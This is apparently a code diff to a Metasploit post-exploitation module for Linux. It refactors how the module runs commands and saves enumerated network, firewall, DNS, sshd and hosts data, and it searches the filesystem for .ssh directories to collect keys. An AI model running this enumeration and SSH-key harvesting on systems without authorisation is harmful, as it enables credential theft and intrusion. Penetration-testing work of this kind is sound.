@@ -33,7 +33,6 @@ class MetasploitModule < Msf::Post
     user = execute("/usr/bin/whoami")
     print_status("Module running as #{user}")
 
-
     # Collect data
     distro = get_sysinfo
     print_good("Info:")
@@ -60,7 +59,7 @@ class MetasploitModule < Msf::Post
     # Save Enumerated data
     save("Network config", nconfig)
     save("Route table", routes)
-    save("Firewall config", iptables + iptables_nat + iptables_man)
+    save("Firewall config", iptables.to_s + iptables_nat.to_s + iptables_man.to_s)
     save("DNS config", resolv)
     save("SSHD config", sshd_conf)
     save("Host file", hosts)
@@ -74,7 +73,7 @@ class MetasploitModule < Msf::Post
 
   # Save enumerated data
   def save(msg, data, ctype="text/plain")
-    if data.nil? || data.include?('not found') || data.include?('cannot access')
+    unless data and !data.empty?
       print_bad("Unable to get data for #{msg}")
       return
     end
@@ -98,8 +97,10 @@ class MetasploitModule < Msf::Post
   end
 
   def execute(cmd)
+    verification_token = Rex::Text::rand_text_alpha(8)
     vprint_status("Execute: #{cmd}")
-    output = cmd_exec(cmd)
+    output = cmd_exec(cmd + " || echo #{verification_token}")
+    return nil if output.include?(verification_token)
     return output
   end
 
@@ -113,7 +114,8 @@ class MetasploitModule < Msf::Post
     keys = []
 
     #Look for .ssh folder, "~/" might not work everytime
-    dirs = execute("/usr/bin/find / -maxdepth 3 -name .ssh").split("\n")
+    vprint_status("Execute: /usr/bin/find / -maxdepth 3 -name .ssh")
+    dirs = cmd_exec("/usr/bin/find / -maxdepth 3 -name .ssh").split("\n")
     ssh_base = ''
     dirs.each do |d|
       if d =~ /(^\/)(.*)\.ssh$/
